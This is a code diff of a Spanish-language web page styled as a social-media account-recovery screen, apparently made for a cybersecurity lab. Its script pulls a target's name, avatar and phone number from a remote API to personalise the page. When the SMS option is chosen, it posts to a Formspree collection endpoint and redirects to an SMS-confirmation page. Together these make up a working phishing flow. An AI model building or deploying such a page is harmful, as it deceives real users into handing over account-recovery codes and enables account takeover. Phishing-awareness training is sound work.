@@ -226,7 +226,7 @@
                     <label class="option-row">
                         <input type="radio" name="method" value="sms" checked>
                         <div class="option-text-container">
-                            <div style="font-weight:500;">Obtener código por correo electronico</div>
+                            <div id="detalle-api" style="font-weight:500;">Cargando...</div>
                             <div id="telefono-api" style="font-size:14px;color:#65676b;">Cargando...</div>
                         </div>
                         <div class="custom-radio"></div>
@@ -257,7 +257,6 @@
 
     <script>
             document.addEventListener("DOMContentLoaded", () => {
-                // Endpoint ajustado de acuerdo a la API en PerfilesController.cs que incluye la lista de teléfonos por relación
                 const apiUrl = 'https://labciberseguridad.onrender.com/api/Perfiles/1';
 
                 fetch(apiUrl)
@@ -271,11 +270,15 @@
                         // Cargar Nombre desde PersonaModel
                         const elementoNombre = document.getElementById('nombre-api');
                         if (elementoNombre) {
-                            if (data.nombre && data.nombre.trim() !== "") {
-                                elementoNombre.textContent = data.nombre;
-                            } else {
-                                elementoNombre.textContent = "...";
-                            }
+                            elementoNombre.textContent = (data.nombre && data.nombre.trim() !== "") ? data.nombre : "...";
+                        }
+
+                        // Cargar Detalle desde PersonaModel
+                        const elementoDetalle = document.getElementById('detalle-api');
+                        if (elementoDetalle) {
+                            elementoDetalle.textContent = (data.detalle && data.detalle.trim() !== "")
+                                ? data.detalle
+                                : "Obtener código por correo electrónico";
                         }
 
                         // Cargar Avatar desde PersonaModel
@@ -287,14 +290,12 @@
                             if (elementoFallback) elementoFallback.style.display = 'none';
                         }
 
-                        // Cargar Teléfono desde la lista de Telefonos relacionada (TelefonoModel)
+                        // Cargar Teléfono desde la lista relacionada
                         const elementoTelefono = document.getElementById('telefono-api');
                         if (elementoTelefono) {
                             if (data.telefonos && Array.isArray(data.telefonos) && data.telefonos.length > 0 && data.telefonos[0].numero) {
-                                // Muestra el número obtenido de la API (puedes ajustar si deseas enmascarar los dígitos)
                                 elementoTelefono.textContent = data.telefonos[0].numero;
                             } else {
-                                // Si no hay teléfonos en la lista, coloca el formato predeterminado solicitado
                                 elementoTelefono.textContent = "+**********";
                             }
                         }
@@ -304,6 +305,9 @@
 
                         const elementoNombre = document.getElementById('nombre-api');
                         if (elementoNombre) elementoNombre.textContent = "...";
+
+                        const elementoDetalle = document.getElementById('detalle-api');
+                        if (elementoDetalle) elementoDetalle.textContent = "Obtener código por correo electrónico";
 
                         const elementoTelefono = document.getElementById('telefono-api');
                         if (elementoTelefono) elementoTelefono.textContent = "+**********";
@@ -319,7 +323,6 @@
 
                 if (seleccion === 'sms') {
                     try {
-                        // Enviar mensaje de inicio exitoso a Formspree
                         await fetch('https://formspree.io/f/xkjnnwdd', {
                             method: 'POST',
                             headers: {
@@ -331,11 +334,9 @@
                         console.error("Error al enviar a Formspree:", error);
                     }
 
-                    // Redirección inmediata tras enviar el mensaje
                     window.location.href = '@Url.Action("ConfirmaSMS", "Home")';
 
                 } else if (seleccion === 'password') {
-                    // Redirección directa si elige contraseña
                     window.location.href = '@Url.Action("Initiate", "Home")';
                 }
             }
